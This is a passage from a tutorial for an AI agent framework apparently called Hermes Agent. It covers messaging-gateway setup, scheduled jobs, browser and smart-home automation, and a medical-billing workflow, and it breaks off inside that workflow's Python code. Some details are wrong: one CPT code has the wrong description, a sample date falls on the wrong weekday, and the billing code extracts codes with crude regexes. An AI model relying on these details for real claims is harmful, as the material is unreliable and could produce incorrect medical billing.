│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐           │
│  │ Telegram    │  │ Discord     │  │ Slack       │           │
│  │ Adapter     │  │ Adapter     │  │ Adapter     │           │
│  └──────┬──────┘  └──────┬──────┘  └──────┬──────┘           │
│         │                │                │                   │
│         └────────────────┼────────────────┘                   │
│                          │                                    │
│                   ┌──────┴──────┐                             │
│                   │ Gateway     │                             │
│                   │ Runner      │                             │
│                   └──────┬──────┘                             │
│                          │                                    │
│         ┌────────────────┼────────────────┐                   │
│         │                │                │                   │
│  ┌──────┴──────┐  ┌──────┴──────┐  ┌──────┴──────┐           │
│  │ Session     │  │ Delivery    │  │ Auth        │           │
│  │ Store       │  │ Manager     │  │ Manager     │           │
│  └─────────────┘  └─────────────┘  └─────────────┘           │
│                                                                │
└──────────────────────────────────────────────────────────────┘
```

### **Supported Platforms**

**Native Platforms (19):**

| Platform | Setup Time | Features |
|----------|------------|----------|
| **Telegram** | 2 min | Text, voice, photos, documents, polls |
| **Discord** | 5 min | Text, voice, DMs, threads, reactions |
| **Slack** | 5 min | Text, threads, files, reactions |
| **WhatsApp** | 3 min | Text, images, documents (via Baileys) |
| **Signal** | 5 min | Text, images, documents (via Signal CLI) |
| **SMS** | 5 min | Text messages (via Twilio) |
| **Email** | 5 min | IMAP/SMTP integration |
| **Matrix** | 5 min | Text, images, files |
| **Mattermost** | 5 min | Text, files, reactions |
| **Home Assistant** | 3 min | Native integration |
| **DingTalk** | 5 min | Text, images, files |
| **WeChat/Weixin** | 5 min | Text, images (via iLink Bot) |
| **Yuanbao** | 5 min | Tencent integration |
| **LINE** | 5 min | Text, images, stickers |
| **SimpleX Chat** | 5 min | Privacy-focused messaging |
| **Google Chat** | 5 min | Text, files, cards |
| **QQBot** | 5 min | Tencent QQ integration |
| **BlueBubbles** | 5 min | iMessage bridge |
| **Webhook** | 2 min | Generic webhook endpoint |

**Plugin Platforms (2):**

| Platform | Setup Time | Features |
|----------|------------|----------|
| **Microsoft Teams** | 10 min | Text, files, tabs |
| **IRC** | 5 min | Text, channels |

### **Setting Up Telegram (Recommended)**

Telegram is the fastest platform to set up:

**Step 1: Create Bot**

1. Open Telegram and search for `@BotFather`
2. Send `/newbot`
3. Follow prompts:
   - Bot name: "My Hermes Assistant"
   - Bot username: "my_hermes_bot" (must end in "bot")
4. Copy the bot token (format: `123456789:ABCdefGHIjklMNOpqrsTUVwxyz`)

**Step 2: Configure Gateway**

```bash
hermes gateway setup
```

Select Telegram and paste the token.

**Step 3: Start Gateway**

```bash
hermes gateway start
```

**Step 4: Test**

Message your bot in Telegram:

```
You: hello
Hermes: Hi! I'm your Hermes Agent assistant. I can help you with tasks,
        manage your calendar, read emails, and much more. What would
        you like to do?
```

### **Setting Up Discord**

**Step 1: Create Discord Application**

1. Go to [Discord Developer Portal](https://discord.com/developers/applications)
2. Click "New Application"
3. Name: "Hermes Agent"
4. Go to "Bot" tab
5. Click "Add Bot"
6. Copy bot token

**Step 2: Configure Bot Permissions**

In Bot settings:

- Enable "Message Content Intent"
- Enable "Server Members Intent"
- Enable "Presence Intent"

**Step 3: Invite Bot to Server**

1. Go to "OAuth2" → "URL Generator"
2. Select scopes: `bot`, `applications.commands`
3. Select bot permissions:
   - Send Messages
   - Read Message History
   - Embed Links
   - Attach Files
   - Read Messages/View Channels
   - Manage Messages (optional)
4. Copy generated URL and open in browser
5. Select server and authorize

**Step 4: Configure Hermes**

```bash
hermes config set DISCORD_BOT_TOKEN your-token-here
hermes gateway setup
# Select Discord
```

**Step 5: Start Gateway**

```bash
hermes gateway start
```

### **Setting Up Slack**

**Step 1: Create Slack App**

1. Go to [Slack API](https://api.slack.com/apps)
2. Click "Create New App"
3. Choose "From scratch"
4. Name: "Hermes Agent"
5. Select workspace

**Step 2: Configure OAuth Scopes**

In "OAuth & Permissions":

- Bot Token Scopes:
  - `chat:write`
  - `chat:write.public`
  - `channels:history`
  - `groups:history`
  - `im:history`
  - `mpim:history`
  - `reactions:write`
  - `files:write`

**Step 3: Enable Socket Mode**

1. Go to "Settings" → "Socket Mode"
2. Enable "Enable Socket Mode"
3. Create app-level token with `connections:write` scope

**Step 4: Install App**

1. Go to "Install App"
2. Click "Install to Workspace"
3. Copy Bot User OAuth Token (starts with `xoxb-`)

**Step 5: Configure Hermes**

```bash
hermes config set SLACK_BOT_TOKEN xoxb-your-token
hermes config set SLACK_APP_TOKEN xapp-your-token
hermes gateway setup
# Select Slack
```

### **Setting Up WhatsApp**

WhatsApp uses the Baileys library (unofficial WhatsApp Web API):

**Step 1: Configure Gateway**

```bash
hermes gateway setup
# Select WhatsApp
```

**Step 2: Scan QR Code**

Hermes will display a QR code in the terminal. Scan it with WhatsApp:

1. Open WhatsApp on your phone
2. Go to Settings → Linked Devices
3. Tap "Link a Device"
4. Scan the QR code

**Step 3: Verify**

```bash
hermes status
# Should show WhatsApp as connected
```

**Note:** WhatsApp sessions expire after ~2 weeks. You'll need to re-scan the QR code periodically.

### **Setting Up Email (IMAP/SMTP)**

**Step 1: Configure Email Credentials**

```bash
hermes config set EMAIL_IMAP_SERVER imap.gmail.com
hermes config set EMAIL_IMAP_PORT 993
hermes config set EMAIL_SMTP_SERVER smtp.gmail.com
hermes config set EMAIL_SMTP_PORT 587
hermes config set EMAIL_USERNAME your-email@gmail.com
hermes config set EMAIL_PASSWORD your-app-password
```

**Note:** For Gmail, use an "App Password" (not your regular password):

1. Go to Google Account → Security
2. Enable 2-Step Verification
3. Go to "App passwords"
4. Generate new app password for "Mail"

**Step 2: Configure Gateway**

```bash
hermes gateway setup
# Select Email
```

**Step 3: Test**

Send an email to your configured address. Hermes will respond via email.

### **Gateway Management**

**Start/Stop Gateway:**

```bash
# Start gateway (foreground)
hermes gateway start

# Start gateway (background)
hermes gateway start --daemon

# Stop gateway
hermes gateway stop

# Restart gateway
hermes gateway restart

# Check status
hermes gateway status
```

**View Connected Channels:**

```bash
hermes channels list
```

**Output:**

```
Connected Channels (3):
  ✓ telegram   (bot: @my_hermes_bot, status: connected)
  ✓ discord    (bot: Hermes Agent#1234, status: connected)
  ✓ email      (user: user@gmail.com, status: connected)

Disconnected Channels (0):
  (none)
```

**Gateway Logs:**

```bash
# View gateway logs
hermes gateway logs

# Follow logs in real-time
hermes gateway logs --follow

# View logs for specific platform
hermes gateway logs --platform telegram
```

### **User Authorization**

Control who can interact with your Hermes agent:

**Allowlist:**

```yaml
gateway:
  allowlist:
    - telegram:123456789    # Platform:user_id
    - discord:987654321
    - email:user@example.com
```

**DM Pairing:**

Require users to pair their DM before interacting:

```yaml
gateway:
  dm_pairing: true
```

When a user DMs the bot for the first time, they receive a pairing code:

```
User: hello
Hermes: To authorize this DM, run this command on your Hermes instance:
        hermes gateway pair telegram:123456789 ABC123
```

Then on the Hermes machine:

```bash
hermes gateway pair telegram:123456789 ABC123
```

### **Cross-Platform Mirroring**

Share context across platforms:

```yaml
gateway:
  mirror:
    enabled: true
    platforms:
      - telegram
      - discord
```

When enabled, conversations on one platform are visible on others.

### **Voice Support**

Hermes supports real-time voice conversations:

**CLI Voice:**

```bash
hermes voice --input mic --output speaker
```

**Telegram Voice:**

Send voice messages to your bot. Hermes will transcribe and respond with voice.

**Discord Voice:**

Join a voice channel with your bot. Hermes will listen and respond in real-time.

**Supported TTS Providers:**

- OpenAI TTS
- Google Cloud TTS
- Amazon Polly
- ElevenLabs
- Local TTS (Coqui, Piper)

---

## **Advanced Features**

### **Terminal UI (TUI)**

Hermes includes a modern terminal UI built with React/Ink:

**Launch TUI:**

```bash
hermes --tui
```

**Features:**

- **Sticky Composer:** Input field always visible at bottom
- **Live Token Streaming:** See responses as they're generated
- **Status Bar:** Shows current model, token count, session info
- **Per-Turn Stopwatch:** Track response times
- **Subagent Observability:** See spawned subagents in real-time
- **Mouse-Friendly:** Click to select, scroll, etc.
- **Rich Overlays:** Tool output displayed in formatted panels

**TUI Commands:**

```
/model          Switch model
/toolsets       Configure toolsets
/skills         Manage skills
/memory         View/edit memory
/session        Session management
/compress       Force compression
/quit           Exit TUI
```

### **Web Dashboard**

Since v0.9.0, Hermes includes a browser-based dashboard:

**Enable Dashboard:**

```bash
hermes config set HERMES_DASHBOARD true
hermes gateway restart
```

**Access Dashboard:**

Open `http://127.0.0.1:9119` in your browser.

**Dashboard Features:**

- **Settings:** Configure model, provider, toolsets
- **Sessions:** View and manage active sessions
- **Skills:** Browse, install, and manage skills
- **Cron Jobs:** View and edit scheduled tasks
- **Logs:** Real-time log viewer
- **Health:** System health and diagnostics
- **Memory:** View and edit MEMORY.md and USER.md

**Security:**

The dashboard is publicly accessible by default. To secure it:

```bash
# Enable OAuth authentication
hermes config set HERMES_DASHBOARD_OAUTH_CLIENT_ID your-client-id
hermes config set HERMES_DASHBOARD_OAUTH_CLIENT_SECRET your-secret
```

**Or restrict to localhost:**

```yaml
gateway:
  dashboard:
    host: 127.0.0.1  # Only accessible from localhost
    port: 9119
```

### **Hermes Desktop**

Native desktop app for non-technical users:

**Features:**

- No CLI required
- Provider setup wizard with presets
- Model selection from live endpoints
- Session management
- Tools and skills management
- Gateway configuration

**Download:** [hermesagents.cc](https://hermesagents.cc)

### **Delegation (Subagents)**

Spawn isolated child agents for parallel workstreams:

**Example:**

```
You: I need to review all PRs in my team repos, check CI status, 
     and prepare a summary
Hermes: I'll delegate this to subagents...
        [spawns 3 parallel agents]
        
        Agent 1: Reviewing PRs...
        Agent 2: Checking CI status...
        Agent 3: Preparing summary...
        
        ✓ Agent 1: PR review complete (5 PRs reviewed)
        ✓ Agent 2: CI status checked (2 failures found)
        ✓ Agent 3: Summary prepared
        
        Here's the consolidated report:
        [summary]
```

**Delegation Patterns:**

- **Parallel Research:** Multiple agents research different topics
- **Code Review:** Agents review different files simultaneously
- **Multi-file Work:** Agents work on different files in parallel
- **Background Tasks:** Agents continue working while you do other things

**Manual Delegation:**

```python
# In code execution
from hermes import delegate

result = delegate(
    task="Research the latest Python async patterns",
    toolsets=["web", "terminal"],
    timeout=300
)
```

### **Code Execution**

Programmatic Python execution with RPC tool access:

**Example:**

```
You: Write a Python script to download all PDFs from a website,
     extract text, and generate a summary
Hermes: Executing code...
        
        [Code execution in sandbox]
        
        ✓ 23 PDFs downloaded
        ✓ Text extracted from all PDFs
        ✓ Summary generated
        
        Summary:
        [summary content]
```

**Code Execution Features:**

- **Sandboxed:** Runs in isolated environment
- **Tool Access:** Can call other Hermes tools via RPC
- **Timeout:** Configurable execution timeout
- **Resource Limits:** CPU, memory, network restrictions
- **Output Capture:** Stdout, stderr, return values

**Configuration:**

```yaml
tools:
  execute_code:
    enabled: true
    timeout: 300  # 5 minutes
    max_memory: 2048  # MB
    allow_network: true
    allowed_imports:
      - requests
      - pandas
      - numpy
    blocked_imports:
      - os
      - subprocess
```

### **Persistent Goals**

Set a standing goal and let Hermes keep working across turns:

**Example:**

```
You: /goal Set up a CI/CD pipeline for my GitHub repo
Hermes: Goal set. Working on it...
        
        [Turn 1]
        ✓ Analyzed repository structure
        ✓ Identified language: Python
        ✓ Created GitHub Actions workflow file
        
        [Turn 2]
        ✓ Configured deployment to staging
        ✓ Set up environment variables
        ✓ Added test stage
        
        [Turn 3]
        ✓ Triggered CI pipeline
        ✓ Tests passing
        ✓ Deployed to staging
        
        ✓ Goal complete! CI/CD pipeline is live.
```

**Goal Commands:**

```
/goal <description>    Set a new goal
/goals                 List active goals
/goal cancel <id>      Cancel a goal
/goal pause <id>       Pause a goal
/goal resume <id>      Resume a goal
```

### **Cron Jobs**

Schedule automated tasks with natural language:

**List Cron Jobs:**

```bash
hermes cron list
```

**Add a Job:**

```bash
hermes cron add "morning-brief" "0 9 * * *" \
  "Check my calendar, summarize urgent emails, and send me a brief on Telegram"
```

**Run a Job Immediately:**

```bash
hermes cron run "morning-brief"
```

**Cron Configuration in config.yaml:**

```yaml
cronjobs:
  - name: morning-brief
    schedule: "0 9 * * *"  # Every day at 9 AM
    task: |
      Check my calendar for today, summarize unread emails from the last 12 hours, 
      and send me a comprehensive brief on Telegram with weather, calendar events, 
      and urgent emails.
    toolsets: ["web", "gmail", "calendar"]
    platform: telegram
    target: user:123456789
  
  - name: weekly-meal-plan
    schedule: "0 18 * * 0"  # Every Sunday at 6 PM
    task: |
      Generate a weekly meal plan with vegetarian and gluten-free options for 4 people,
      create a shopping list, add to Notion, and send summary to Telegram.
    toolsets: ["notion", "web"]
    platform: telegram
  
  - name: github-monitor
    schedule: "*/30 * * * *"  # Every 30 minutes
    task: |
      Check open PRs and CI failures in my team repos, notify on Discord if anything 
      needs attention.
    toolsets: ["github"]
    platform: discord
    target: channel:123456789
```

**Cron Schedule Format:**

```
┌───────────── minute (0 - 59)
│ ┌───────────── hour (0 - 23)
│ │ ┌───────────── day of month (1 - 31)
│ │ │ ┌───────────── month (1 - 12)
│ │ │ │ ┌───────────── day of week (0 - 6) (Sunday = 0)
│ │ │ │ │
* * * * *
```

**Examples:**

- `0 9 * * *` - Every day at 9:00 AM
- `*/15 * * * *` - Every 15 minutes
- `0 0 * * 0` - Every Sunday at midnight
- `0 18 * * 1-5` - Weekdays at 6:00 PM
- `0 0 1 * *` - First day of every month at midnight

### **Browser Automation**

Hermes can control a Chrome instance for web automation:

**Example:**

```
You: open Hacker News and get me the top 5 posts
Hermes: Opening news.ycombinator.com...
        [Browser automation in progress]
        
        Top 5 posts right now:
        1. "Show HN: I built a local-first task manager" (287 points)
        2. "The cost of JavaScript in 2026" (421 points)
        3. "PostgreSQL 17 performance improvements" (156 points)
        4. "Why I switched from React to HTMX" (892 points)
        5. "Building a compiler from scratch" (234 points)

You: take a screenshot of my portfolio website
Hermes: Opening yourportfolio.com...
        ✓ Screenshot saved to ~/Screenshots/portfolio_20260210.png
```

**Browser Tools:**

```yaml
browser:
  - browser_navigate      # Navigate to URL
  - browser_snapshot      # Take accessibility snapshot
  - browser_vision        # Visual screenshot analysis
  - browser_click         # Click element
  - browser_type          # Type text into field
  - browser_select        # Select dropdown option
  - browser_scroll        # Scroll page
  - browser_wait          # Wait for element
  - browser_evaluate      # Execute JavaScript
  - browser_screenshot    # Take visual screenshot
```

**Browser Backends:**

| Backend | Use Case |
|---------|----------|
| `local` | Local Chrome instance |
| `remote` | Remote browser (Browserless, Playwright) |
| `headless` | Headless Chrome (no UI) |
| `docker` | Browser in Docker container |
| `cloud` | Cloud browser service |

**Configuration:**

```yaml
browser:
  backend: local
  headless: false
  timeout: 30
  viewport:
    width: 1920
    height: 1080
  user_agent: "Mozilla/5.0..."
```

### **Vision and Image Generation**

**Vision Analysis:**

```
You: analyze this image [attached]
Hermes: [Analyzes image with vision model]
        
        This image shows:
        - A modern office space with open floor plan
        - 12 workstations arranged in pods
        - Natural lighting from large windows
        - Plants and greenery throughout
        - Collaborative areas with whiteboards
```

**Image Generation:**

```
You: generate an image of a cat sitting on a laptop
Hermes: [Generating image with DALL-E/Flux]
        ✓ Image generated: cat_laptop.png
        
        [Displays generated image]
```

**Supported Image Models:**

- DALL-E 3 (OpenAI)
- Flux (Black Forest Labs)
- Stable Diffusion (Stability AI)
- Midjourney (via API)
- Local models (via ComfyUI)

### **Context Files**

Project context files automatically injected into every conversation:

**Supported Context Files:**

| File | Purpose |
|------|---------|
| `.hermes.md` | Project-specific context |
| `AGENTS.md` | Agent instructions |
| `CLAUDE.md` | Claude-compatible context |
| `SOUL.md` | Global personality |
| `.cursorrules` | Cursor IDE rules |

**Example .hermes.md:**

```markdown
# Project Context

## Overview
This is a FastAPI backend for an e-commerce platform.

## Tech Stack
- Python 3.11
- FastAPI
- PostgreSQL
- Redis
- Docker

## Code Style
- Use type hints everywhere
- Follow PEP 8
- Use async/await for all I/O
- Write docstrings for all functions

## Testing
- Use pytest
- Aim for 80%+ coverage
- Run tests before committing

## Deployment
- Docker containers
- Kubernetes orchestration
- CI/CD via GitHub Actions
```

**Context References:**

Use inline @-syntax to attach files, folders, git diffs, and URLs:

```
You: @src/main.py Can you review this file?
You: @git diff HEAD~5..HEAD Summarize recent changes
You: @https://github.com/example/repo/pull/42 Review this PR
You: @docs/ API documentation needs updating
```

### **Personality & SOUL.md**

Customize Hermes Agent's personality:

**Global SOUL.md:**

```markdown
# Agent Personality

You are a helpful, enthusiastic AI assistant who loves to code.
You communicate clearly and concisely.
You always ask clarifying questions when tasks are ambiguous.
You're particularly good at Python, TypeScript, and DevOps.

## Communication Style
- Direct and technical
- Use code examples when possible
- Avoid verbose explanations
- Be honest about limitations

## Values
- Privacy and security first
- Open-source preferences
- Simplicity over complexity
- Automation over manual work
```

**Built-in Personalities:**

```bash
# List available personalities
hermes personality list

# Switch personality
hermes personality set developer
hermes personality set executive
hermes personality set creative
hermes personality set teacher
hermes personality set friend
```

**Personality Profiles:**

| Personality | Style |
|-------------|-------|
| **Default** | Balanced, helpful |
| **Developer** | Code-focused, technical |
| **Executive** | Concise, business-focused |
| **Creative** | Imaginative, exploratory |
| **Teacher** | Explanatory, patient |
| **Friend** | Casual, conversational |

**Custom Personality:**

```bash
hermes personality create my-personality
# Opens editor to create custom SOUL.md
```

---

## **Real-World Automation Workflows**

### **Workflow 1: Morning Brief Automation**

**Goal:** Receive a comprehensive daily briefing at 8 AM covering calendar, email, weather, and priorities.

**Setup:**

```bash
# Create the cron job
hermes cron add "morning-brief" "0 8 * * *" \
  "Generate my morning brief: check today's calendar, summarize urgent emails from last 12 hours, get weather forecast, list today's tasks from Todoist, and send to Telegram"

# Configure toolsets for this job
hermes config set cronjobs.morning-brief.toolsets '["calendar", "gmail", "web", "todoist"]'
hermes config set cronjobs.morning-brief.platform telegram
hermes config set cronjobs.morning-brief.target user:123456789
```

**Advanced Configuration (config.yaml):**

```yaml
cronjobs:
  - name: morning-brief
    schedule: "0 8 * * *"
    timezone: "America/Los_Angeles"
    task: |
      Generate a comprehensive morning brief for today. Include:
      
      1. **Calendar Overview**
         - List all meetings with times and attendees
         - Highlight conflicts or back-to-back meetings
         - Note preparation time needed
      
      2. **Email Triage**
         - Scan unread emails from last 12 hours
         - Categorize: Urgent (needs response today), Important (this week), Low (can wait)
         - For urgent emails, provide 1-sentence summary
         - Draft quick responses for urgent emails (save as drafts)
      
      3. **Weather & Commute**
         - Today's weather forecast
         - Any weather alerts
         - Commute conditions if relevant
      
      4. **Task Priorities**
         - Pull today's tasks from Todoist
         - Rank by priority and deadline
         - Flag overdue items
      
      5. **Quick Wins**
         - Identify 2-3 tasks that can be completed in <15 minutes
         - Suggest optimal order for the day
      
      Format as a clean, scannable brief with emojis for visual hierarchy.
      Keep it under 500 words.
    toolsets:
      - calendar
      - gmail
      - web
      - todoist
      - memory
    platform: telegram
    target: user:123456789
    retry_on_failure: true
    max_retries: 3
```

**Sample Output:**

```
🌅 Good Morning, Mehdi! (Sunday, July 3, 2026)

📅 TODAY'S CALENDAR
━━━━━━━━━━━━━━━━━━
9:00 AM  - Team Standup (30m) [Zoom]
          └─ Attendees: Backend team (6)
11:00 AM - Client Call: Acme Corp (1h) [Google Meet]
          └─ ⚠️ Prep needed: Review Q1 metrics deck
2:00 PM  - Product Review (45m) [In-person, Room 4B]
4:30 PM  - 1:1 with Sarah (30m) [Office]
          └─ 📝 Note: Discuss promotion timeline

⚡ CONFLICTS: None
🔄 BACK-TO-BACK: 2:00-4:30 PM (3 meetings, 15m breaks)

📧 EMAIL TRIAGE
━━━━━━━━━━━━━━━━━━
🔴 URGENT (2)
  • Client X proposal revision needed by EOD
    └─ Draft saved: "Revised_Proposal_v2.md"
  • Server outage alert (resolved, needs post-mortem)
  
🟡 IMPORTANT (3)
  • PR #234 awaiting your review (backend team)
  • Finance: Q1 budget approval needed
  • Partner API integration docs updated
  
🟢 LOW PRIORITY (8)
  • Newsletters (3), promotions (5)

🌤️ WEATHER & COMMUTE
━━━━━━━━━━━━━━━━━━
• 52°F, partly cloudy → 68°F high
• No rain expected
• Commute: Normal traffic, ~35 min

✅ TASK PRIORITIES
━━━━━━━━━━━━━━━━━━
🔥 HIGH (Due Today)
  1. [ ] Finalize client proposal [2h]
  2. [ ] Review PR #234 [30m]
  
⚠️ OVERDUE (1)
  1. [!] Update API documentation [2h] [Due: Yesterday]

📊 MEDIUM (This Week)
  1. [ ] Write post-mortem for server outage [1h]
  2. [ ] Prepare Q1 metrics deck [3h]

🚀 QUICK WINS (<15 min)
  1. Reply to finance budget email
  2. Approve pending expense reports
  3. Update team status in Slack

💡 SUGGESTED SCHEDULE
━━━━━━━━━━━━━━━━━━
8:30-9:00  → Quick wins (emails, approvals)
9:00-9:30  → Standup
9:30-11:00 → Deep work: Client proposal
11:00-12:00 → Client call
12:00-1:00 → Lunch
1:00-2:00  → PR review + API docs
2:00-4:30  → Meetings block
4:30-5:00  → 1:1 with Sarah
5:00-6:00  → Wrap up + plan tomorrow

Have a productive day! 🎯
```

### **Workflow 2: GitHub Monitoring & Auto-Response**

**Goal:** Monitor team repositories, auto-triage issues, and notify on critical events.

**Setup:**

```yaml
cronjobs:
  - name: github-monitor
    schedule: "*/15 * * * *"  # Every 15 minutes
    task: |
      Monitor GitHub repositories for the team:
      
      1. **New Issues** (last 15 min)
         - Categorize: bug, feature, question, documentation
         - For bugs: Check if reproducible, label appropriately
         - For questions: Draft response if answer is in docs
         - Auto-assign based on CODEOWNERS
      
      2. **Pull Requests**
         - New PRs: Request reviews from CODEOWNERS
         - Stale PRs (>3 days): Send gentle reminder
         - Failed CI: Notify author with error summary
         - Approved PRs: Auto-merge if all checks pass
      
      3. **CI/CD Status**
         - Failed workflows: Analyze logs, suggest fixes
         - Deployment status: Notify on success/failure
      
      4. **Security Alerts**
         - Dependabot alerts: Prioritize by severity
         - Create issues for critical vulnerabilities
      
      Only notify me if:
      - Critical security alert
      - CI failure on main branch
      - PR needs my review (>24h old)
      - Customer-reported bug
      
      Otherwise, handle automatically and log actions.
    toolsets:
      - github
      - terminal
      - memory
    platform: discord
    target: channel:dev-notifications
```

**Sample Output (Critical Event):**

```
🚨 CRITICAL: GitHub Alert

🔒 SECURITY VULNERABILITY
━━━━━━━━━━━━━━━━━━━━━━━━
Repository: acme-corp/payment-api
Severity: HIGH (CVSS 8.9)
Package: lodash@4.17.20
Issue: Prototype Pollution
CVE: CVE-2021-23337

📋 AUTO-ACTIONS TAKEN:
  ✓ Created issue #456: "Security: Update lodash to 4.17.21"
  ✓ Assigned to @security-team
  ✓ Added labels: security, priority-high, automated
  ✓ Opened PR #457 with fix
  ✓ Triggered CI pipeline

⏳ AWAITING:
  • Security team review (auto-assigned)
  • CI checks to complete

📊 CI STATUS (Other Repos)
━━━━━━━━━━━━━━━━━━━━━━━━
✅ payment-api/main: Passing
✅ frontend/main: Passing
⚠️ mobile-app/feature-auth: Failing
   └─ Error: Type mismatch in auth.ts:42
   └─ Suggestion: Update type definition

💬 PR ACTIVITY
━━━━━━━━━━━━━━━━━━━━━━━━
🆕 New PRs (2):
  • #235: "Add rate limiting to API endpoints" by @dev1
    └─ Auto-assigned to @backend-team
  • #89: "Redesign dashboard UI" by @designer
    └─ Auto-assigned to @frontend-team

🔄 Stale PRs (1):
  • #230: "Refactor database queries" by @dev2
    └─ Opened 4 days ago, no reviews
    └─ Sent reminder to reviewers

✅ Auto-merged (1):
  • #228: "Update dependencies" (all checks passed)

📈 STATS (Last 24h)
━━━━━━━━━━━━━━━━━━━━━━━━
• Issues created: 5 (2 bugs, 2 features, 1 question)
• PRs merged: 3
• CI runs: 47 (44 passed, 3 failed)
• Deployments: 2 (2 successful)
```

### **Workflow 3: Smart Home Automation with Context**

**Goal:** Intelligent home control that learns your patterns and automates routines.

**Setup:**

```yaml
# Install Home Assistant skill
skills:
  install:
    - homeassistant

# Configure smart home automation
cronjobs:
  - name: morning-routine
    schedule: "0 7 * * 1-5"  # Weekdays at 7 AM
    task: |
      Execute morning routine:
      
      1. Check if anyone is home (presence detection)
      2. If home:
         - Turn on bedroom lights (50% brightness, warm white)
         - Start coffee maker
         - Set thermostat to 72°F
         - Open blinds in living room
         - Turn on bathroom heater
      3. If away:
         - Skip all actions
         - Log "Morning routine skipped - no one home"
      4. Check weather:
         - If raining: Close smart blinds
         - If cold (<50°F): Pre-heat house to 74°F
      5. Send summary to Telegram
    toolsets:
      - homeassistant
      - web
    platform: telegram

  - name: night-routine
    schedule: "0 23 * * *"
    task: |
      Execute night routine:
      
      1. Turn off all lights except:
         - Bedroom (if someone is in bedroom)
         - Hallway (dimmed to 10%)
      2. Lock all doors
      3. Arm security system (home mode)
      4. Set thermostat to 68°F (sleep mode)
      5. Check if any doors/windows are open
         - If yes: Notify and wait 5 minutes
         - If still open: Force close if possible
      6. Turn off smart plugs (except fridge, router)
      7. Enable camera recording
      8. Send security summary
    toolsets:
      - homeassistant
    platform: telegram
```

**Interactive Control:**

```
You: turn off all lights
Hermes: ✓ Turned off 12 lights across 4 rooms
        └─ Living room: 4 lights
        └─ Kitchen: 3 lights
        └─ Bedroom: 2 lights
        └─ Bathroom: 3 lights

You: set living room temperature to 72°F
Hermes: ✓ Set living room thermostat to 72°F
        Current: 69°F → Target: 72°F
        Estimated time: 15 minutes

You: show me the front door camera
Hermes: [Retrieves camera feed]
        ✓ Front door camera:
        [Displays live snapshot]
        Last motion: 2 hours ago
        Status: Secure

You: is anyone home?
Hermes: 🏠 Presence Detection:
        • Living room: 1 person (motion detected 2 min ago)
        • Bedroom: 0 people
        • Office: 1 person (phone connected to WiFi)
        • Garage: 0 people
        
        Summary: 2 people home

You: goodnight
Hermes: 🌙 Goodnight routine initiated...
        ✓ Turned off 11 lights (kept bedroom on)
        ✓ Locked all doors (3 doors)
        ✓ Armed security system (home mode)
        ✓ Set thermostat to 68°F
        ✓ All windows closed
        ✓ Turned off 8 smart plugs
        ✓ Enabled camera recording
        
        🏠 Home is secure. Sleep well!
```

### **Workflow 4: Medical Billing Automation (Real Case Study)**

**Background:** An anesthesiologist was spending 2-3 hours daily on medical billing paperwork.

**Problem:**

- Read procedure notes from EMR (Electronic Medical Record)
- Extract CPT (Current Procedural Terminology) codes
- Generate billing forms
- Submit to multiple insurance portals
- Track claim status and follow-ups

**Solution:**

```yaml
skills:
  install:
    - medical-billing

cronjobs:
  - name: daily-billing
    schedule: "0 18 * * *"  # Every day at 6 PM
    task: |
      Process today's medical billing:
      
      1. Fetch procedure notes from EMR
         - Endpoint: ${EMR_ENDPOINT}/procedures
         - Date: Today
         - Filter: Anesthesiology procedures only
      
      2. For each procedure:
         - Extract patient information
         - Identify CPT codes from procedure notes
         - Map to ICD-10 diagnosis codes
         - Calculate billing amounts
         - Generate CMS-1500 form
      
      3. Submit claims to insurance portals:
         - BlueCross: ${BCBS_PORTAL}
         - Aetna: ${AETNA_PORTAL}
         - Medicare: ${MEDICARE_PORTAL}
         - Track submission status
      
      4. Generate daily report:
         - Total procedures processed
         - Total amount billed
         - Claims submitted vs pending
         - Any errors or rejections
         - Estimated reimbursement
      
      5. Save report to Notion database
      
      6. Send summary to Telegram
    toolsets:
      - medical-billing
      - web
      - notion
    platform: telegram
```

**Skill Implementation (medical-billing.md):**

```markdown
---
name: medical-billing
description: Automate medical billing workflow for anesthesiology
version: 2.1.0
author: hermes-agent
created: 2025-08-15
tags:
  - healthcare
  - automation
  - billing
  - anesthesiology
tools_required:
  - web_extract
  - terminal
  - write_file
  - notion
config:
  emr_endpoint: https://emr.hospital.com/api
  emr_token: ${EMR_API_TOKEN}
  insurance_portals:
    - name: BlueCross
      url: https://bcbs.com/claims/api
      token: ${BCBS_TOKEN}
    - name: Aetna
      url: https://aetna.com/claims/api
      token: ${AETNA_TOKEN}
    - name: Medicare
      url: https://medicare.gov/claims/api
      token: ${MEDICARE_TOKEN}
  cpt_codes:
    common:
      - "00400"  # Anesthesia for upper abdominal procedures
      - "00790"  # Anesthesia for lower intestinal endoscopic procedures
      - "00800"  # Anesthesia for lower intestinal endoscopic procedures
      - "01967"  # Anesthesia for cesarean section
      - "99100"  # Anesthesia for patient of extreme age
    modifiers:
      - "AA"  # Anesthesia performed personally by anesthesiologist
      - "QX"  # CRNA service with medical direction by physician
      - "QY"  # Medical direction of one CRNA
---

# Medical Billing Automation

## Overview
This skill automates the complete medical billing workflow for anesthesiology procedures, from EMR data extraction to insurance claim submission.

## Workflow

### Step 1: Fetch Procedure Notes
```python
import requests
from datetime import date

def fetch_procedures(emr_endpoint, emr_token, target_date=None):
    """Fetch procedure notes from EMR system."""
    if target_date is None:
        target_date = date.today().isoformat()
    
    response = requests.get(
        f"{emr_endpoint}/procedures",
        params={
            "date": target_date,
            "department": "anesthesiology",
            "status": "completed"
        },
        headers={"Authorization": f"Bearer {emr_token}"}
    )
    response.raise_for_status()
    return response.json()
```

### Step 2: Extract CPT Codes

```python
import re

def extract_cpt_codes(procedure_notes):
    """Extract CPT codes from procedure notes using pattern matching."""
    # Common anesthesia CPT code patterns
    cpt_patterns = [
        r'\b(00[1-9][0-9]{2})\b',  # 00100-00999
        r'\b(01[1-9][0-9]{2})\b',  # 01100-01999
        r'\b(991[0-9]{2})\b',      # 99100-99199 (special services)
    ]
    
    codes = []
    for pattern in cpt_patterns:
        matches = re.findall(pattern, procedure_notes)
        codes.extend(matches)
    
    # Remove duplicates and sort
    return sorted(list(set(codes)))

def extract_icd10_codes(procedure_notes):
    """Extract ICD-10 diagnosis codes."""
    # ICD-10 pattern (e.g., A00-B99, G00-G99, etc.)
    icd_pattern = r'\b([A-Z]\d{2}(?:\.\d{1,4})?)\b'
    codes = re.findall(icd_pattern, procedure_notes)
    return sorted(list(set(codes)))
```

### Step 3: Generate Billing Forms

```python
def generate_cms1500_form(procedure, cpt_codes, icd_codes):
    """Generate CMS-1500 billing form."""
    form = {
        # Patient information
        "patient_name": procedure["patient_name"],
        "patient_dob": procedure["patient_dob"],
